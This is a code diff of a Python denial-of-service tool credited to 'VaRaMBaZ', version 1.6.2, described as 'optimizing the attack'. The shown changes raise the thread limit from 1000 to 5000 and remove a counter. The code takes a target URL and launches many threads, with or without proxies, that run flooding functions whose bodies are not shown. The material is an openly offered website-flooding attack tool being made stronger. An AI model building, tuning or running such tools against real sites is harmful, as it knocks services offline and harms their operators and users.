@@ -99,7 +99,6 @@ print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/
 print("Creator: VaRaMBaZ")
 print("Version: 1.6.2; Improving the menu and optimizing the attack \n")
 
-sum = 0
 url = input("URL: ")
 if not url.__contains__("http"):
     exit(colorama.Fore.RED + "URL doesnt contains http or https!")
@@ -108,11 +107,11 @@ if not url.__contains__("."):
     exit(colorama.Fore.RED + "Invalid domain")
 
 try:
-    threads = int(input("Threads[max 1000]: "))
+    threads = int(input("Threads[max 5000]: "))
 except ValueError:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-if threads == 0 or threads > 1000:
+if threads == 0 or threads > 5000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
 bar = threading.Barrier(threads)
@@ -122,12 +121,10 @@ print("")
 print(colorama.Fore.YELLOW + "Starting threads...")
 if (proxyuseage == 1):
     for i in range(0, threads):
-        sum = sum + 1
         thr = threading.Thread(target=dospause1, args=(bar, url, ))
         thr.start()
 else:
     for i in range(0, threads):
-        sum = sum + 1
         thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
